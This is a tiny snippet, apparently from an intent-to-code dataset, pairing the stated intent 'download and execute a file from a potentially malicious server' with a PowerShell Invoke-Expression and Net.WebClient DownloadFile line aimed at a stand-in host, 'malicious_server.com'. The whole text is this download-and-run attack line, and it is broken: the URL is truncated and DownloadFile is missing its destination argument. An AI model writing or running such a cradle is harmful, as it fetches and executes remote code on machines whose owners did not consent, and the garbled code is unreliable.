# Natural language intent:
# Download and execute a file from a potentially malicious server using Invoke-Expression.

Invoke-Expression -Command "& { (New-Object Net.WebClient).DownloadFile('http://malicious_server.com/malicious_')}"
